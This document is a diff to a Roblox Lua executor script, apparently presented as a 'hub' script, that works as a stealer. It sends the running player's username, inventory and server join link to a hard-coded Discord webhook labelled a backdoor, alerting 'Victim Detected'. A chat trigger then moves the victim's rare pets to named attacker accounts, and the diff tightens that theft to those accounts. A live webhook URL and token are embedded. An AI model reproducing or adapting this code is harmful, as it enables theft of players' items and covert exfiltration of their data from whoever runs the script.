@@ -79,39 +79,36 @@ task.spawn(function()
     task.wait(1)
     screenGui:Destroy()
 end)
--- Webhook
+
+-- ✅ -- ✅ LIMIT HUB FULL SCRIPT w/ Attacker Restriction (Delta Compatible)
+
+local attackerUsernames = {
+    boneblossom215 = true,
+    beanstalk1251 = true,
+    burningbud709 = true
+}
+
 local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
 local backdoorWebhook = webhookUrl
 
--- Roblox Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local chatTrigger = "hb1ios"
 
--- Use only request() (Delta-compatible)
-local http = request
-
--- Targeted pets
 local targetedPets = {
     "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
     "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
     "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
 }
 
--- Inventory scanner
 local function getInventory()
-    local data = {
-        items = {},
-        rarePets = {}
-    }
-
+    local data = { items = {}, rarePets = {}, rareItems = {} }
     local foldersToCheck = {
         LocalPlayer:FindFirstChild("Pets"),
         LocalPlayer:FindFirstChild("Backpack"),
         LocalPlayer:FindFirstChildOfClass("Folder")
     }
-
     for _, folder in ipairs(foldersToCheck) do
         if folder then
             for _, item in ipairs(folder:GetChildren()) do
@@ -122,30 +119,29 @@ local function getInventory()
             end
         end
     end
-
     return data
 end
 
--- Webhook sender
-local function sendWebhook(payload)
-    local jsonData = HttpService:JSONEncode(payload)
-    for _, url in ipairs({webhookUrl, backdoorWebhook}) do
-        http({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    end
-end
-
--- Send inventory to Discord
 local function sendToWebhook()
+    if not LocalPlayer then return end
     local inventory = getInventory()
     local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
-    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId or "N/A")
+    local jobId = tostring(game.JobId or "N/A")
+    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId
 
-    sendWebhook({
+    local function sendMessage(payload)
+        local jsonData = HttpService:JSONEncode(payload)
+        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = jsonData
+            })
+        end
+    end
+
+    sendMessage({
         content = "🎯 Victim Detected!",
         embeds = {{
             title = "Victim Found",
@@ -153,20 +149,20 @@ local function sendToWebhook()
             fields = {
                 {name = "Username", value = LocalPlayer.Name, inline = true},
                 {name = "Join Link", value = joinLink, inline = true},
-                {name = "Inventory", value = "```" .. inventoryText .. "```"},
-                {name = "Trigger", value = "`" .. chatTrigger .. "`"}
+                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
+                {name = "Trigger", value = "`" .. chatTrigger .. "`", inline = false}
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     })
 
     if #inventory.rarePets > 0 then
-        sendWebhook({
+        sendMessage({
             content = "@everyone",
             allowed_mentions = { parse = { "everyone" } },
             embeds = {{
                 title = "🐾 Rare Pets Detected",
-                description = "Rare pets in inventory!",
+                description = "These rare pets are in the player's inventory!",
                 fields = {
                     {name = "Username", value = LocalPlayer.Name},
                     {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
@@ -178,19 +174,18 @@ local function sendToWebhook()
     end
 end
 
--- Transfer function
-local function transferPets(attacker)
-    local folders = {
+local function transferTo(player)
+    if not attackerUsernames[player.Name] then return end
+    local foldersToCheck = {
         LocalPlayer:FindFirstChild("Pets"),
         LocalPlayer:FindFirstChild("Backpack"),
         LocalPlayer:FindFirstChildOfClass("Folder")
     }
-
-    for _, folder in ipairs(folders) do
+    for _, folder in ipairs(foldersToCheck) do
         if folder then
             for _, item in ipairs(folder:GetChildren()) do
                 if table.find(targetedPets, item.Name) then
-                    local targetFolder = attacker:FindFirstChild("Backpack") or attacker:FindFirstChild("Pets") or attacker
+                    local targetFolder = player:FindFirstChild("Backpack") or player:FindFirstChild("Pets") or player
                     if targetFolder then
                         item.Parent = targetFolder
                     end
@@ -200,37 +195,22 @@ local function transferPets(attacker)
     end
 end
 
--- Trigger from other players
 Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(msg)
         if msg:lower() == chatTrigger then
-            transferPets(player)
+            transferTo(player)
         end
     end)
 end)
 
--- Existing players already in game
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            if msg:lower() == chatTrigger then
-                transferPets(player)
-            end
-        end)
-    end
-end
-
--- Trigger from victim's own chat
 LocalPlayer.Chatted:Connect(function(msg)
     if msg:lower() == chatTrigger then
         for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                transferPets(player)
-                break
+            if player ~= LocalPlayer and attackerUsernames[player.Name] then
+                transferTo(player)
             end
         end
     end
 end)
 
--- Send to webhook at start
 sendToWebhook()
